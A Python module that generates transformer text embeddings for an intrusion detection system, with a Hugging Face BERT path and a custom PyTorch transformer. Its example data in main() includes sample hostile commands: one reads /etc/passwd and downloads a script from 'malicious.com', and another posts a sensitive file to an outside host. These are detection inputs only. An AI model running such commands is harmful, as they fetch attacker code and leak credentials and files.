#!/usr/bin/env python3
"""
Text Embeddings Generator using Transformers
============================================

This module provides functionality to generate high-quality text embeddings using
state-of-the-art transformer models for cybersecurity text analysis and intrusion detection.

Features:
- Support for multiple transformer models (BERT, RoBERTa, DistilBERT, etc.)
- Batch processing for efficiency
- GPU acceleration support
- Customizable embedding dimensions
- Integration with cybersecurity text data

Author: Explainable Intrusion Detection System
"""

import torch
import torch.nn as nn
import torch.nn.functional as F
import numpy as np
from transformers import AutoTokenizer, AutoModel
from typing import List, Union, Optional, Dict, Any, Tuple
import logging
from pathlib import Path
import json
from tqdm import tqdm
import math

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class PositionalEncoding(nn.Module):
    """Positional encoding for transformer models."""
    
    def __init__(self, d_model: int, max_len: int = 5000):
        super().__init__()
        
        pe = torch.zeros(max_len, d_model)
        position = torch.arange(0, max_len, dtype=torch.float).unsqueeze(1)
        div_term = torch.exp(torch.arange(0, d_model, 2).float() * 
                           (-math.log(10000.0) / d_model))
        
        pe[:, 0::2] = torch.sin(position * div_term)
        pe[:, 1::2] = torch.cos(position * div_term)
        pe = pe.unsqueeze(0).transpose(0, 1)
        
        self.register_buffer('pe', pe)
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        return x + self.pe[:x.size(0), :]


class MultiHeadAttention(nn.Module):
    """Multi-head attention mechanism."""
    
    def __init__(self, d_model: int, num_heads: int, dropout: float = 0.1):
        super().__init__()
        assert d_model % num_heads == 0
        
        self.d_model = d_model
        self.num_heads = num_heads
        self.d_k = d_model // num_heads
        
        self.w_q = nn.Linear(d_model, d_model)
        self.w_k = nn.Linear(d_model, d_model)
        self.w_v = nn.Linear(d_model, d_model)
        self.w_o = nn.Linear(d_model, d_model)
        
        self.dropout = nn.Dropout(dropout)
        
    def scaled_dot_product_attention(self, Q: torch.Tensor, K: torch.Tensor, 
                                   V: torch.Tensor, mask: Optional[torch.Tensor] = None) -> Tuple[torch.Tensor, torch.Tensor]:
        """Scaled dot-product attention."""
        scores = torch.matmul(Q, K.transpose(-2, -1)) / math.sqrt(self.d_k)
        
        if mask is not None:
            scores = scores.masked_fill(mask == 0, -1e9)
        
        attention_weights = F.softmax(scores, dim=-1)
        attention_weights = self.dropout(attention_weights)
        
        output = torch.matmul(attention_weights, V)
        return output, attention_weights
    
    def forward(self, query: torch.Tensor, key: torch.Tensor, value: torch.Tensor,
                mask: Optional[torch.Tensor] = None) -> Tuple[torch.Tensor, torch.Tensor]:
        batch_size = query.size(0)
        
        # Linear transformations and split into heads
        Q = self.w_q(query).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        K = self.w_k(key).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        V = self.w_v(value).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        
        # Apply attention
        attention_output, attention_weights = self.scaled_dot_product_attention(Q, K, V, mask)
        
        # Concatenate heads
        attention_output = attention_output.transpose(1, 2).contiguous().view(
            batch_size, -1, self.d_model)
        
        # Final linear transformation
        output = self.w_o(attention_output)
        
        return output, attention_weights


class FeedForward(nn.Module):
    """Position-wise feed-forward network."""
    
    def __init__(self, d_model: int, d_ff: int, dropout: float = 0.1):
        super().__init__()
        self.linear1 = nn.Linear(d_model, d_ff)
        self.linear2 = nn.Linear(d_ff, d_model)
        self.dropout = nn.Dropout(dropout)
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        return self.linear2(self.dropout(F.relu(self.linear1(x))))


class TransformerBlock(nn.Module):
    """Transformer encoder block."""
    
    def __init__(self, d_model: int, num_heads: int, d_ff: int, dropout: float = 0.1):
        super().__init__()
        self.attention = MultiHeadAttention(d_model, num_heads, dropout)
        self.feed_forward = FeedForward(d_model, d_ff, dropout)
        self.norm1 = nn.LayerNorm(d_model)
        self.norm2 = nn.LayerNorm(d_model)
        self.dropout = nn.Dropout(dropout)
    
    def forward(self, x: torch.Tensor, mask: Optional[torch.Tensor] = None) -> Tuple[torch.Tensor, torch.Tensor]:
        # Self-attention with residual connection
        attn_output, attention_weights = self.attention(x, x, x, mask)
        x = self.norm1(x + self.dropout(attn_output))
        
        # Feed-forward with residual connection
        ff_output = self.feed_forward(x)
        x = self.norm2(x + self.dropout(ff_output))
        
        return x, attention_weights


class PyTorchTransformer(nn.Module):
    """Custom PyTorch implementation of Transformer for text embeddings."""
    
    def __init__(
        self,
        vocab_size: int,
        d_model: int = 512,
        num_heads: int = 8,
        num_layers: int = 6,
        d_ff: int = 2048,
        max_len: int = 512,
        dropout: float = 0.1,
        padding_idx: int = 0
    ):
        super().__init__()
        self.d_model = d_model
        self.vocab_size = vocab_size
        self.padding_idx = padding_idx
        
        # Embedding layers
        self.token_embedding = nn.Embedding(vocab_size, d_model, padding_idx=padding_idx)
        self.positional_encoding = PositionalEncoding(d_model, max_len)
        
        # Transformer blocks
        self.transformer_blocks = nn.ModuleList([
            TransformerBlock(d_model, num_heads, d_ff, dropout)
            for _ in range(num_layers)
        ])
        
        # Output layers
        self.layer_norm = nn.LayerNorm(d_model)
        self.dropout = nn.Dropout(dropout)
        
    def create_padding_mask(self, x: torch.Tensor) -> torch.Tensor:
        """Create padding mask for attention."""
        return (x != self.padding_idx).unsqueeze(1).unsqueeze(2)
    
    def forward(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:
        """
        Forward pass through the transformer.
        
        Args:
            x: Input token ids of shape (batch_size, seq_len)
            
        Returns:
            output: Transformer output of shape (batch_size, seq_len, d_model)
            attention_weights: List of attention weights from each layer
        """
        # Create padding mask
        mask = self.create_padding_mask(x)
        
        # Token embeddings
        x = self.token_embedding(x) * math.sqrt(self.d_model)
        
        # Add positional encoding
        x = self.positional_encoding(x.transpose(0, 1)).transpose(0, 1)
        x = self.dropout(x)
        
        # Pass through transformer blocks
        attention_weights = []
        for transformer_block in self.transformer_blocks:
            x, attn_weights = transformer_block(x, mask)
            attention_weights.append(attn_weights)
        
        # Final layer normalization
        output = self.layer_norm(x)
        
        return output, attention_weights
    
    def get_embeddings(self, x: torch.Tensor, pooling_strategy: str = "cls") -> torch.Tensor:
        """
        Get sentence-level embeddings from the transformer output.
        
        Args:
            x: Input token ids of shape (batch_size, seq_len)
            pooling_strategy: Strategy for pooling ('cls', 'mean', 'max')
            
        Returns:
            embeddings: Sentence embeddings of shape (batch_size, d_model)
        """
        output, _ = self.forward(x)
        
        if pooling_strategy == "cls":
            # Use first token (CLS) representation
            return output[:, 0, :]
        elif pooling_strategy == "mean":
            # Mean pooling over non-padding tokens
            mask = (x != self.padding_idx).float().unsqueeze(-1)
            masked_output = output * mask
            return masked_output.sum(dim=1) / mask.sum(dim=1)
        elif pooling_strategy == "max":
            # Max pooling over non-padding tokens
            mask = (x != self.padding_idx).float().unsqueeze(-1)
            masked_output = output * mask
            masked_output[mask == 0] = -1e9  # Set padding to very negative value
            return masked_output.max(dim=1)[0]
        else:
            raise ValueError(f"Unknown pooling strategy: {pooling_strategy}")


class CustomTokenizer:
    """Simple tokenizer for the custom transformer."""
    
    def __init__(self, vocab_size: int = 10000, max_length: int = 512):
        self.vocab_size = vocab_size
        self.max_length = max_length
        self.word_to_idx = {}
        self.idx_to_word = {}
        self.padding_idx = 0
        self.unk_idx = 1
        
        # Initialize special tokens
        self.word_to_idx['<PAD>'] = self.padding_idx
        self.word_to_idx['<UNK>'] = self.unk_idx
        self.idx_to_word[self.padding_idx] = '<PAD>'
        self.idx_to_word[self.unk_idx] = '<UNK>'
        
    def build_vocab(self, texts: List[str]):
        """Build vocabulary from texts."""
        word_counts = {}
        for text in texts:
            words = text.lower().split()
            for word in words:
                word_counts[word] = word_counts.get(word, 0) + 1
        
        # Sort by frequency and take top vocab_size-2 words
        sorted_words = sorted(word_counts.items(), key=lambda x: x[1], reverse=True)
        
        for i, (word, count) in enumerate(sorted_words[:self.vocab_size-2]):
            idx = i + 2
            self.word_to_idx[word] = idx
            self.idx_to_word[idx] = word
    
    def encode(self, text: str) -> List[int]:
        """Encode text to token ids."""
        words = text.lower().split()
        token_ids = []
        
        for word in words:
            if word in self.word_to_idx:
                token_ids.append(self.word_to_idx[word])
            else:
                token_ids.append(self.unk_idx)
        
        # Pad or truncate to max_length
        if len(token_ids) > self.max_length:
            token_ids = token_ids[:self.max_length]
        else:
            token_ids.extend([self.padding_idx] * (self.max_length - len(token_ids)))
        
        return token_ids
    
    def encode_batch(self, texts: List[str]) -> torch.Tensor:
        """Encode batch of texts to token ids."""
        return torch.tensor([self.encode(text) for text in texts], dtype=torch.long)


class TextEmbeddingGenerator:
    """
    A class for generating text embeddings using transformer models.
    
    This class provides methods to generate embeddings from cybersecurity text data
    such as log entries, command sequences, and system events for use in GNN-based
    intrusion detection systems.
    """
    
    def __init__(
        self,
        model_name: str = "bert-base-uncased",
        device: Optional[str] = None,
        max_length: int = 512,
        batch_size: int = 32
    ):
        """
        Initialize the TextEmbeddingGenerator.
        
        Args:
            model_name (str): Name of the transformer model to use
            device (str, optional): Device to run the model on ('cuda' or 'cpu')
            max_length (int): Maximum sequence length for tokenization
            batch_size (int): Batch size for processing
        """
        self.model_name = model_name
        self.max_length = max_length
        self.batch_size = batch_size
        
        # Set device
        if device is None:
            self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        else:
            self.device = torch.device(device)
        
        logger.info(f"Using device: {self.device}")
        logger.info(f"Loading model: {model_name}")
        
        # Load tokenizer and model
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModel.from_pretrained(model_name)
        self.model.to(self.device)
        self.model.eval()
        
        logger.info("Model loaded successfully")
    
    def generate_embeddings(
        self,
        texts: Union[List[str], str],
        pooling_strategy: str = "cls",
        normalize: bool = True
    ) -> np.ndarray:
        """
        Generate embeddings for input texts.
        
        Args:
            texts (Union[List[str], str]): Input text(s) to embed
            pooling_strategy (str): Strategy for pooling token embeddings ('cls', 'mean', 'max')
            normalize (bool): Whether to normalize embeddings
            
        Returns:
            np.ndarray: Generated embeddings
        """
        if isinstance(texts, str):
            texts = [texts]
        
        embeddings = []
        
        # Process in batches
        for i in tqdm(range(0, len(texts), self.batch_size), desc="Generating embeddings"):
            batch_texts = texts[i:i + self.batch_size]
            batch_embeddings = self._process_batch(batch_texts, pooling_strategy, normalize)
            embeddings.append(batch_embeddings)
        
        return np.vstack(embeddings)
    
    def _process_batch(
        self,
        texts: List[str],
        pooling_strategy: str,
        normalize: bool
    ) -> np.ndarray:
        """Process a batch of texts to generate embeddings."""
        # Tokenize
        encoded = self.tokenizer(
            texts,
            padding=True,
            truncation=True,
            max_length=self.max_length,
            return_tensors="pt"
        )
        
        # Move to device
        encoded = {k: v.to(self.device) for k, v in encoded.items()}
        
        # Generate embeddings
        with torch.no_grad():
            outputs = self.model(**encoded)
            hidden_states = outputs.last_hidden_state
            attention_mask = encoded["attention_mask"]
            
            # Apply pooling strategy
            if pooling_strategy == "cls":
                embeddings = hidden_states[:, 0, :]  # CLS token
            elif pooling_strategy == "mean":
                # Mean pooling with attention mask
                mask_expanded = attention_mask.unsqueeze(-1).expand(hidden_states.size()).float()
                sum_embeddings = torch.sum(hidden_states * mask_expanded, 1)
                sum_mask = torch.clamp(mask_expanded.sum(1), min=1e-9)
                embeddings = sum_embeddings / sum_mask
            elif pooling_strategy == "max":
                # Max pooling
                mask_expanded = attention_mask.unsqueeze(-1).expand(hidden_states.size()).float()
                hidden_states[mask_expanded == 0] = -1e9  # Set padding tokens to very negative value
                embeddings = torch.max(hidden_states, 1)[0]
            else:
                raise ValueError(f"Unknown pooling strategy: {pooling_strategy}")
            
            # Normalize if requested
            if normalize:
                embeddings = torch.nn.functional.normalize(embeddings, p=2, dim=1)
        
        return embeddings.cpu().numpy()
    
    def generate_embeddings_for_cybersecurity(
        self,
        log_entries: List[str],
        command_sequences: List[str] = None,
        system_events: List[str] = None,
        save_path: Optional[str] = None
    ) -> Dict[str, np.ndarray]:
        """
        Generate embeddings specifically for cybersecurity data.
        
        Args:
            log_entries (List[str]): System log entries
            command_sequences (List[str], optional): Command sequences
            system_events (List[str], optional): System events
            save_path (str, optional): Path to save embeddings
            
        Returns:
            Dict[str, np.ndarray]: Dictionary containing embeddings for each data type
        """
        embeddings = {}
        
        # Process log entries
        if log_entries:
            logger.info(f"Processing {len(log_entries)} log entries...")
            embeddings["log_entries"] = self.generate_embeddings(
                log_entries, 
                pooling_strategy="mean",
                normalize=True
            )
        
        # Process command sequences
        if command_sequences:
            logger.info(f"Processing {len(command_sequences)} command sequences...")
            embeddings["command_sequences"] = self.generate_embeddings(
                command_sequences,
                pooling_strategy="cls",
                normalize=True
            )
        
        # Process system events
        if system_events:
            logger.info(f"Processing {len(system_events)} system events...")
            embeddings["system_events"] = self.generate_embeddings(
                system_events,
                pooling_strategy="mean",
                normalize=True
            )
        
        # Save embeddings if path provided
        if save_path:
            self.save_embeddings(embeddings, save_path)
        
        return embeddings
    
    def save_embeddings(self, embeddings: Dict[str, np.ndarray], save_path: str):
        """Save embeddings to disk."""
        save_path = Path(save_path)
        save_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Save as numpy arrays
        for key, emb in embeddings.items():
            np.save(save_path.parent / f"{save_path.stem}_{key}.npy", emb)
        
        # Save metadata
        metadata = {
            "model_name": self.model_name,
            "max_length": self.max_length,
            "embedding_shapes": {k: v.shape for k, v in embeddings.items()},
            "device": str(self.device)
        }
        
        with open(save_path.parent / f"{save_path.stem}_metadata.json", "w") as f:
            json.dump(metadata, f, indent=2)
        
        logger.info(f"Embeddings saved to {save_path.parent}")
    
    def load_embeddings(self, load_path: str) -> Dict[str, np.ndarray]:
        """Load embeddings from disk."""
        load_path = Path(load_path)
        
        # Load metadata
        with open(load_path.parent / f"{load_path.stem}_metadata.json", "r") as f:
            metadata = json.load(f)
        
        # Load embeddings
        embeddings = {}
        for key, shape in metadata["embedding_shapes"].items():
            emb_path = load_path.parent / f"{load_path.stem}_{key}.npy"
            if emb_path.exists():
                embeddings[key] = np.load(emb_path)
        
        logger.info(f"Loaded embeddings from {load_path.parent}")
        return embeddings


class CustomTransformerEmbeddingGenerator:
    """
    A class for generating text embeddings using custom PyTorch transformer implementation.
    
    This class provides an alternative to Hugging Face transformers using a custom
    PyTorch implementation, giving more control over the architecture and training process.
    """
    
    def __init__(
        self,
        vocab_size: int = 10000,
        d_model: int = 512,
        num_heads: int = 8,
        num_layers: int = 6,
        d_ff: int = 2048,
        max_length: int = 512,
        dropout: float = 0.1,
        device: Optional[str] = None
    ):
        """
        Initialize the CustomTransformerEmbeddingGenerator.
        
        Args:
            vocab_size (int): Size of the vocabulary
            d_model (int): Model dimension
            num_heads (int): Number of attention heads
            num_layers (int): Number of transformer layers
            d_ff (int): Feed-forward dimension
            max_length (int): Maximum sequence length
            dropout (float): Dropout rate
            device (str, optional): Device to run the model on
        """
        self.vocab_size = vocab_size
        self.d_model = d_model
        self.max_length = max_length
        
        # Set device
        if device is None:
            self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        else:
            self.device = torch.device(device)
        
        # Initialize tokenizer
        self.tokenizer = CustomTokenizer(vocab_size, max_length)
        
        # Initialize model
        self.model = PyTorchTransformer(
            vocab_size=vocab_size,
            d_model=d_model,
            num_heads=num_heads,
            num_layers=num_layers,
            d_ff=d_ff,
            max_len=max_length,
            dropout=dropout
        ).to(self.device)
        
        logger.info(f"Custom transformer initialized on {self.device}")
        logger.info(f"Model parameters: {sum(p.numel() for p in self.model.parameters()):,}")
    
    def build_vocabulary(self, texts: List[str]):
        """Build vocabulary from training texts."""
        logger.info(f"Building vocabulary from {len(texts)} texts...")
        self.tokenizer.build_vocab(texts)
        logger.info(f"Vocabulary size: {len(self.tokenizer.word_to_idx)}")
    
    def generate_embeddings(
        self,
        texts: Union[List[str], str],
        pooling_strategy: str = "cls",
        batch_size: int = 32
    ) -> np.ndarray:
        """
        Generate embeddings for input texts using custom transformer.
        
        Args:
            texts (Union[List[str], str]): Input text(s) to embed
            pooling_strategy (str): Strategy for pooling token embeddings
            batch_size (int): Batch size for processing
            
        Returns:
            np.ndarray: Generated embeddings
        """
        if isinstance(texts, str):
            texts = [texts]
        
        embeddings = []
        
        # Process in batches
        for i in tqdm(range(0, len(texts), batch_size), desc="Generating embeddings"):
            batch_texts = texts[i:i + batch_size]
            
            # Tokenize
            token_ids = self.tokenizer.encode_batch(batch_texts).to(self.device)
            
            # Generate embeddings
            with torch.no_grad():
                batch_embeddings = self.model.get_embeddings(token_ids, pooling_strategy)
                embeddings.append(batch_embeddings.cpu().numpy())
        
        return np.vstack(embeddings)
    
    def generate_embeddings_for_cybersecurity(
        self,
        log_entries: List[str],
        command_sequences: List[str] = None,
        system_events: List[str] = None,
        save_path: Optional[str] = None
    ) -> Dict[str, np.ndarray]:
        """
        Generate embeddings specifically for cybersecurity data using custom transformer.
        
        Args:
            log_entries (List[str]): System log entries
            command_sequences (List[str], optional): Command sequences
            system_events (List[str], optional): System events
            save_path (str, optional): Path to save embeddings
            
        Returns:
            Dict[str, np.ndarray]: Dictionary containing embeddings for each data type
        """
        embeddings = {}
        
        # Process log entries
        if log_entries:
            logger.info(f"Processing {len(log_entries)} log entries...")
            embeddings["log_entries"] = self.generate_embeddings(
                log_entries, 
                pooling_strategy="mean"
            )
        
        # Process command sequences
        if command_sequences:
            logger.info(f"Processing {len(command_sequences)} command sequences...")
            embeddings["command_sequences"] = self.generate_embeddings(
                command_sequences,
                pooling_strategy="cls"
            )
        
        # Process system events
        if system_events:
            logger.info(f"Processing {len(system_events)} system events...")
            embeddings["system_events"] = self.generate_embeddings(
                system_events,
                pooling_strategy="mean"
            )
        
        # Save embeddings if path provided
        if save_path:
            self.save_embeddings(embeddings, save_path)
        
        return embeddings
    
    def save_embeddings(self, embeddings: Dict[str, np.ndarray], save_path: str):
        """Save embeddings to disk."""
        save_path = Path(save_path)
        save_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Save as numpy arrays
        for key, emb in embeddings.items():
            np.save(save_path.parent / f"{save_path.stem}_{key}.npy", emb)
        
        # Save metadata
        metadata = {
            "model_type": "custom_pytorch_transformer",
            "vocab_size": self.vocab_size,
            "d_model": self.d_model,
            "max_length": self.max_length,
            "embedding_shapes": {k: v.shape for k, v in embeddings.items()},
            "device": str(self.device)
        }
        
        with open(save_path.parent / f"{save_path.stem}_metadata.json", "w") as f:
            json.dump(metadata, f, indent=2)
        
        logger.info(f"Custom transformer embeddings saved to {save_path.parent}")
    
    def train_model(self, texts: List[str], labels: List[int], epochs: int = 10, lr: float = 0.001):
        """
        Train the custom transformer model (placeholder for future implementation).
        
        Args:
            texts (List[str]): Training texts
            labels (List[int]): Training labels
            epochs (int): Number of training epochs
            lr (float): Learning rate
        """
        logger.info("Training functionality not implemented yet. Use pre-trained models for now.")
        # This would contain the training loop for the custom transformer
        # For now, we'll use the randomly initialized model


def main():
    """Example usage of both TextEmbeddingGenerator implementations."""
    
    # Example cybersecurity data
    log_entries = [
        "User authentication failed for user 'admin' from IP 192.168.1.100",
        "File access denied: /etc/passwd by user 'guest'",
        "Network connection established to suspicious IP 10.0.0.1",
        "System shutdown initiated by user 'root'",
        "Database query executed: SELECT * FROM users WHERE admin=1"
    ]
    
    command_sequences = [
        "sudo su - && cat /etc/passwd && wget http://malicious.com/script.sh",
        "ps aux | grep ssh && netstat -an | grep :22",
        "find / -name '*.log' -exec grep -l 'error' {} \\;",
        "curl -X POST http://api.example.com/data -d @sensitive.json"
    ]
    
    system_events = [
        "Process created: /usr/bin/python3 /opt/script.py",
        "File modified: /var/log/auth.log",
        "Network connection: 192.168.1.50:22 -> 10.0.0.1:443",
        "Registry key accessed: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet"
    ]
    
    print("=" * 80)
    print("🤖 HUGGING FACE TRANSFORMERS IMPLEMENTATION")
    print("=" * 80)
    
    # Initialize Hugging Face generator
    hf_generator = TextEmbeddingGenerator(
        model_name="bert-base-uncased",
        device="cuda" if torch.cuda.is_available() else "cpu",
        max_length=256,
        batch_size=16
    )
    
    # Generate embeddings using Hugging Face transformers
    hf_embeddings = hf_generator.generate_embeddings_for_cybersecurity(
        log_entries=log_entries,
        command_sequences=command_sequences,
        system_events=system_events,
        save_path="embeddings/hf_cybersecurity_embeddings"
    )
    
    # Print results
    for data_type, emb in hf_embeddings.items():
        print(f"HF {data_type}: {emb.shape}")
    
    print("\nHF Example embedding for first log entry:")
    print(hf_embeddings["log_entries"][0][:10])  # First 10 dimensions
    
    print("\n" + "=" * 80)
    print("🔧 CUSTOM PYTORCH TRANSFORMER IMPLEMENTATION")
    print("=" * 80)
    
    # Initialize custom transformer generator
    custom_generator = CustomTransformerEmbeddingGenerator(
        vocab_size=5000,
        d_model=256,
        num_heads=8,
        num_layers=4,
        d_ff=1024,
        max_length=128,
        dropout=0.1,
        device="cuda" if torch.cuda.is_available() else "cpu"
    )
    
    # Build vocabulary from all texts
    all_texts = log_entries + command_sequences + system_events
    custom_generator.build_vocabulary(all_texts)
    
    # Generate embeddings using custom transformer
    custom_embeddings = custom_generator.generate_embeddings_for_cybersecurity(
        log_entries=log_entries,
        command_sequences=command_sequences,
        system_events=system_events,
        save_path="embeddings/custom_cybersecurity_embeddings"
    )
    
    # Print results
    for data_type, emb in custom_embeddings.items():
        print(f"Custom {data_type}: {emb.shape}")
    
    print("\nCustom Example embedding for first log entry:")
    print(custom_embeddings["log_entries"][0][:10])  # First 10 dimensions
    
    print("\n" + "=" * 80)
    print("📊 COMPARISON SUMMARY")
    print("=" * 80)
    print("Hugging Face Transformers:")
    print(f"  - Model: BERT-base-uncased")
    print(f"  - Embedding dimension: {hf_embeddings['log_entries'].shape[1]}")
    print(f"  - Pre-trained: Yes")
    print(f"  - Ready for production: Yes")
    
    print("\nCustom PyTorch Transformer:")
    print(f"  - Model: Custom implementation")
    print(f"  - Embedding dimension: {custom_embeddings['log_entries'].shape[1]}")
    print(f"  - Pre-trained: No (randomly initialized)")
    print(f"  - Ready for production: After training")
    
    print("\n✅ Both implementations successfully generated embeddings!")
    print("💡 Use Hugging Face for immediate results, Custom for research/experimentation")


if __name__ == "__main__":
    main()
